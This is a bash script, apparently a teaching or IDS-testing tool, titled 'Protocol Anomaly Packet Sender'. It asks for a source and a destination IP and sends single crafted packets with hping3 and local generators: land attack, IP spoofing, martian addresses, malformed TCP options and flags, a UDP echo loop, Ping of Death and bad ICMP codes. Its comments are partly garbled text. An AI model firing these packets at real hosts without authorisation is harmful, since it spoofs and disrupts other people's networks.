#!/bin/bash

clear

clear
echo "==========================================================================================="
echo "      >---martion_ip--->                                                                         "
echo "                                                                  <---land_source---<"
echo "      >---ip_spooping--->                                                                        "
echo "                                                                  <---echo_loop---<  "
echo "      >---error_option--->                                                                       "
echo "                                                                  <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                  >---martion_ip--->                                                                         "
echo "                                                      <---land_source---<"
echo "                  >---ip_spooping--->                                                                        "
echo "                                                      <---echo_loop---<  "
echo "                  >---error_option--->                                                                       "
echo "                                                      <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                        >---martion_ip--->                                                                         "
echo "                                                <---land_source---<"
echo "                        >---ip_spooping--->                                                                        "
echo "                                                <---echo_loop---<  "
echo "                        >---error_option--->                                                                       "
echo "                                                <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                              >---martion_ip--->                                                                         "
echo "                                          <---land_source---<"
echo "                              >---ip_spooping--->                                                                    "
echo "                                          <---echo_loop---<  "
echo "                              >---error_option--->                                                                       "
echo "                                          <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                                          >---martion_ip--->                               "
echo "                              <---land_source---<"
echo "                                          >---ip_spooping--->                              "
echo "                              <---echo_loop---<  "
echo "                                          >---error_option--->                             "
echo "                              <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                                                      >---martion_ip--->                   "
echo "                  <---land_source---<"
echo "                                                      >---ip_spooping--->                  "
echo "                  <---echo_loop---<  "
echo "                                                      >---error_option--->                 "
echo "                  <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                                                                  >---martion_ip--->       "
echo "      <---land_source---<"
echo "                                                                  >---ip_spooping--->      "
echo "      <---echo_loop---<  "
echo "                                                                  >---error_option--->     "
echo "      <---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear
echo "==========================================================================================="
echo "                                                                         >---martion_ip--->"
echo "<---land_source---<"
echo "                                                                        >---ip_spooping--->"
echo "<---echo_loop---<  "
echo "                                                                       >---error_option--->"
echo "<---error_mss---<  "
echo "==========================================================================================="
sleep 0.2
clear

echo "==========================================================================================="
echo "Welcome to easy,,,,"
echo "    _____  __   ___  _____      ___   ___     _____  __      __  __"
echo "   / __  | | | /   |/  __ \    /   | /   |   / __  | | |     \ \/ / "
echo "  / /__| | | |/ /| || |  | |  / /| |/ /| |  / /__| | | |      \  / "
echo " / ____  | | | / | || |__| | / / |___/ | | / ____  | | |___   / /"
echo "/_/    |_| |__/  |_|\_____/ /_/        |_|/_/    |_| |_____| /_/  "
echo "==========================================================================================="
# ... ... ... IP ..
echo "Enter the IP of Source IP"
read sourceIP
# ... ... ... IP ..
echo "Enter the IP of Destination IP"
read destIP

while true
do
        clear
        echo "Protocol Anomoly Packet Sender"
        echo "Client                                         Server"
        echo "$sourceIP                                  $destIP"
        echo "======================IPv4/IPv6======================"
        echo " 1 : 소스 라우팅 옵션 사용"
        echo " 2 : 랜드 공격(Land Attack)"
        echo " 3 : 마션 주소(Martion Address)"
        echo " 4 : IP 스푸핑"
        echo "=========================TCP========================="
        echo " 5 : 출발지/목적지 포트가 같거나 0인 경우"
        echo " 6 : 예약 필드 사용"
        echo " 7 : 잘못된 제어 비트 사용"
        echo " 8 : 헤더 길이 불일치"
        echo " 9 : 잘못된 MSS 옵션 사용"
        echo "10 : 잘못된 윈도 옵션 사용"
        echo "11 : 잘못된 SACK 옵션 사용"
        echo "12 : SYN/RST 패킷에 데이터 사용"
        echo "=========================UDP========================="
        echo "13 : 에코 루프(Echo Loop)"
        echo "14 : 출발지/목적지 포트가 0인 경우"
        echo "15 : 헤더 길이 불일치"
        echo "=========================ICMP========================"
        echo "16 : 죽음의 핑(Ping of Death)"
        echo "17 : 헤더 길이 불일치"
        echo "18 : 잘못된 Code 필드 사용"
        echo "19 : 목적지 도달 불가"
        echo "====================================================="
        echo "20 : EXIT"
        echo ""
        echo "Enter the number of packet"
        read number


case $number in
    1) # .. ... .. ..
        clear
        hping3 $destIP -S -k -s 100 -p 10 -G --lsrr $destIP -c 1
        sleep 1
    ;;
    2)# .. ..
        clear
        hping3 $destIP -S -a $destIP -c 1
        sleep 1
    ;;
    3)# .. ..
        clear
        hping3 $destIP -S -a 224.0.0.1 -p 80 -c 1
        sleep 1
    ;;
    4)# IP ...
        clear
    # ... IP ..
        echo "?ㅽ뫖??IP (紐⑹쟻吏? ?숈씪 ???쓽 IP濡??낅젰): "
        read spoof_ip
        hping3 $destIP -S -a $spoof_ip -p 80 -c 1
        sleep 1
    ;;
    5)# .../... ... ... 0. ..
        clear
        hping3 $destIP -S -k -s 0 -p 0 -c 1
        sleep 1
    ;;
    6)# .. .. ..
        clear
        ./packet_gen_old 0 $sourceIP $destIP 0 6 1000 1001 1000 "" 1 0 0 0 0 0 1
        sleep 1
    ;;
    7)# ... .. .. ..
        clear
        hping3 $destIP -S -F -k -s 100 -p 10 -c 1
        sleep 1
    ;;
    8)# .. .. ...
        clear
        hping3 $destIP -S -k -s 100 -p 10 -O 100 -c 1
        sleep 1
    ;;
    9)# ... MSS .. ..
        clear
        ./packet_gen_old 0 $sourceIP $destIP 0 6 1000 1001 0 "" 0 0 0 0 0 0 0 2
        sleep 1
    ;;
    10)# ... .. .. ..
        clear
        ./packet_gen_old 0 $sourceIP $destIP 0 6 1000 1001 0 "" 0 0 0 0 0 0 0 3
        sleep 1
    ;;
    11)# ... SACK .. ..
        clear
        ./packet_gen_old 0 $sourceIP $destIP 0 6 1000 1001 0 "" 0 0 0 0 0 0 0 4
        sleep 1
    ;;
    12)# SYN/RST ... ... ..
        clear
        hping3 $destIP -S -k -s 100 -p 10 -d 1000 -c 1
        sleep 1
    ;;
    13)# .. ..
        clear
        hping3 $destIP -2 -s 7 -p 19 -k -c 1
        sleep 1
    ;;
    14)# .../... ... 0. ..
        clear
        hping3 $destIP -2 -s 0 -p 0 -k -c 1
        sleep 1
    ;;
    15)# .. .. ...
        clear
        ./packet_gen 0 $sourceIP $destIP 6 17 1000 1001 100 "ABC"
        sleep 1
    ;;
    16)# ... .
        clear
        hping3 $destIP -C 8 -K 0 -d 1024 -c 1
        sleep 1
    ;;
    17)# .. .. ...
        clear
        ./packet_gen 0 $sourceIP $destIP 6 1 8 0 100 "ABC"
        sleep 1
    ;;
    18)# ... Code .. ..
        clear
        hping3 $destIP -C 5 -K 20 -c 1
        sleep 1
    ;;
    19)# ... Code .. ..
        clear
        hping3 -1 $destIP -C 3 -K 1 -c 1
        sleep 1
    ;;

    20)#
        clear
        echo "Bye Bye~!"
        sleep 1
        exit
    ;;
esac

done
